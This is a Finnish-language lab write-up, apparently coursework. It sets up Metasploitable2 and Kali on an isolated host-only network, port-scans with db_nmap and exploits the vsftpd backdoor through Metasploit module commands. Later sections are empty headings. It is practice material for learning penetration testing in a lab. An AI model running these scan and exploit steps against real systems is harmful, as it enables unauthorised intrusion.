# A Metasploitable asennus ja oma verkko
Asennetaan Metasploitable2 virtuaalikone ja eristetään se omaan verkkoonsa Kalin kanssa
Virtualboxissa avataan Host Network Manager ja luodaan toinen ethernet adapteri.

![image](https://user-images.githubusercontent.com/71498717/199259815-7c68bb02-58f4-4a86-912d-2ddb964e1ca2.png)

Sen jälkeen molempien virtuaalikoneiden asetuksista lisätään Host-only Adapter, jolloin molemmat koneet on samassa verkossa ja ne eivät ole yhteydessä ulkomaailmaan.

![image](https://user-images.githubusercontent.com/71498717/199260874-2716b749-a04e-4ac9-9162-13284d644983.png)

Pitää myös muistaa irroittaa kaapeli Kalista, ettei vahingossakaan käy hassusti

![image](https://user-images.githubusercontent.com/71498717/199261519-58c753c5-d7bc-4786-8f52-77e233795428.png)


# B Porttiskannaus

Etsitään ensin metasploitable koneen ip-osoite.
```ifconfig```

![image](https://user-images.githubusercontent.com/71498717/199263409-19ea2c66-b23e-43a3-9f12-b38f43777583.png)

Sieltä löytyi ip mitä tutkitaan tarkemmin.

Avataan metasploit

```sudo msfdb run```

ja tarkistetaan tietokannan status

```db_status```

![image](https://user-images.githubusercontent.com/71498717/199265624-f43c469a-a72e-44b0-83a5-cf4c5688d683.png)

Luodaan metasploitable työtila
```workspace -a metasploitable```

Tehdään nmap tiedettyyn ip-osoitteeseen

```db_nmap -p- -A 192.168.252.3 -oA ports```

```-p-``` Tällä käydään kaikki avoimet portit läpi. ```-A``` vivulla saadaan käyttöjärjestelmä ja version tunnistus. ```-oA ports``` Tällä tallennetan saatu tulos "ports" tiedostoon.

Avoimia portteja oli runsaasti ja silmään pisti tunnillakäydyn perusteella portti 21 ja ftp service sekä portin 1524 bindshell

![image](https://user-images.githubusercontent.com/71498717/199274157-33822ca8-fe1d-4900-b0fb-0a4592b27edf.png)


 
# C Murtaudu Metasploitableen
Aloitetaan murtautuminen tutkimalla löytyykö metasploitista valmiiksi joku scripti.
``` search vsftpd```

![image](https://user-images.githubusercontent.com/71498717/199290877-c58b785f-2d03-46ac-9f7c-143a1f366f02.png)

Sieltä löytyi käutettävä moduuli jota käytetään komennolla  ```use 0```
asetetaan maali ip moduulille ```setg rhosts 192.168.252.3```

![image](https://user-images.githubusercontent.com/71498717/199291767-0a81fae9-8418-4d2c-bb89-8df95514531c.png)

ajetaan moduuli ```run``` komennolla ja ```ls``` komennolla varmistetaan, että ollaan sisällä

![image](https://user-images.githubusercontent.com/71498717/199292992-553f2e1f-74ef-4d5f-8c4f-a8bfd6fdff5d.png)

 
# D  Murtaudu Metasploitableen jollain toisella tavalla (eri kuin edellisessä kohdassa)
# E Vulnhub. Asenna jokin kone VulnHubista ja tunkeudu siihen. Kannattaa valita helppo.
# H
# I
# J
